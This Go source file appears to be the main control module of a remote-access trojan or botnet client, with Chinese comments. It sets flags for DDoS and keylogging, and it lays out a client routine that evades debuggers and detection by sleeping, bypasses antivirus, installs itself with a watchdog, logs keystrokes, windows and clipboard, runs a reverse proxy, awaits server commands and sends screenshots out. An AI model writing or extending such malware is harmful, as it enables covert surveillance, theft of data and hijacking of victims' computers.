/*
Author: FreeKnight
变量数据
 */
// 部分变量将被加密存储，在使用时才进行解密，目的是用来防止软件检测
// 创建 Bot 这样一个注册表项，用来存储数据（加密后的）
//------------------------------------------------------------
package components
//------------------------------------------------------------
import (
	"os"
	"strings"
	"time"
	"strconv"
)
//------------------------------------------------------------
var (
	isFKDebug      		bool = true	// 是否当前在Debug

	//============================================================
	// 全局变量
	//============================================================
	isAdmin        		bool = false	// 是否是管理员权限
	isDDoS         		bool = false
	isUserActionLogging 	bool = false	// 是否发送键盘信息

	//============================================================
	// 临时变量
	//============================================================
	myUID          		string	// 本客户端的唯一编号（以便服务器识别）
	lastCommand    		string	// 上一條處理的服務器命令
	isLastCommandFinished 	bool	// 上一條服務器命令是否已處理完畢
	tmpKeylogBuffer 	string	// 臨時記錄的鍵盤信息的内存块
	myIP           		string	// 本客户端的IP
	myExeName      		string	// 本客户端名（在注册表中的键值）
	myInstallReg   		string	// 本客户端在注册表中的键名
)
//------------------------------------------------------------
func setDDoSMode(mode bool) {
	isDDoS = mode
}

// 設置是否記錄並發送鍵盤信息
func setUserActionLoggerMode(mode bool) {
	isUserActionLogging = mode
}

// 记录是否是管理员权限
func setAdmin(is bool) {
	isAdmin = is
}

// 檢查是否是管理員
func checkIsAdmin() string {
	if isAdmin {
		return "Yes"
	}
	return "No"
}
//------------------------------------------------------------
func FKMain() {
	FKDebugLog("Ver: " + clientVersion)
	// 若执行的是看门狗模式
	if (strings.Contains(os.Args[0], watchdogName+".exe")){
		isSingleton := checkIsSingleInstance(watchdogKey)
		FKDebugLog("Is Singleton: " + strconv.FormatBool(isSingleton))
		if isSingleton {
			watchDogMain()
		}else{
			os.Exit(1)
		}
	} else {
		// 检查是否是单例
		isSingleton := checkIsSingleInstance(instanceKey)
		FKDebugLog("Is Singleton: " + strconv.FormatBool(isSingleton))
		if(isSingleton) {
			clientMain()
		}else{
			//time.Sleep(10000)
			//messageBox(startUpErrorTitle, startUpErrorText, MB_ICONERROR)
			os.Exit(1)
		}
	}
}
//------------------------------------------------------------
// 执行的是Watch Dog模式
func watchDogMain(){
	FKDebugLog("Watch dog model start...")

	if antiDebug && isDetect(){		// 若開啟了反調試程序的檢查，且被調試程序掛上了
		doSthAfterDetect();		// 做些标准处理
	}
	// 加载下本机的基本信息： IP，客户端唯一ID，检查管理员权限
	loadInfo()
	// 检查本软件的安装情况
	checkInstalledInfo()

	FKDebugLog("Local IP = " + myIP)
	FKDebugLog("Local UID = " + myUID)
	FKDebugLog("Is Admin = " + checkIsAdmin())
	FKDebugLog("My exe name = " + myExeName)
	FKDebugLog("My reg key = " + myInstallReg)

	// 休眠五秒
	time.Sleep(5 * time.Second)
	FKDebugLog("Start loop...")

	// 执行看门狗进行进程守护
	watchDog()	// 自身Loop
	// 下面是不会执行的
}
//------------------------------------------------------------
// 执行的正常客户端模式
func clientMain(){
	// 先休眠下
	if sleepOnRun{
		goToSleep(sleepOnRunTime)
	}

	if antiDebug && isDetect(){		// 若開啟了反調試程序的檢查，且被調試程序掛上了
		doSthAfterDetect();		// 做些标准处理
	}

	if antiVirusBypass{			// 若開啟了反病毒檢查模式
		bypassAntiVirus()		// 繞過反病毒檢查
	}

	// 加载下本机的基本信息： IP，客户端唯一ID，检查管理员权限
	loadInfo()

	// 检查自我安装情况
	checkInstalledInfoEx()

	// 喘口气，避免被检测到
	takeALongRest()

	if activeDefense && installMe{
		// 开启主动防御
		go runActiveDefense()
	}

	// 喘口气，避免被检测到
	takeALongRest()


	if autoKeylogger{
		// 单独开多个线程，分别记录活动窗口，键盘，剪贴板等信息
		setUserActionLoggerMode(true)
		startUserActionLogger()
	}

	if autoReverseProxy{
		// 启动反向代理
		startReverseProxy(reverseProxyPort, reverseProxyBackend)
	}

	// 喘口气，避免被检测到
	takeALongRest()

	// 单独开启一个线程，死循环等待消息
	go checkCommand()
	// 单独开启一个线程，死循环截图
	if autoScreenShot {
		go sendScreenshotToServer()
	}
}
//------------------------------------------------------------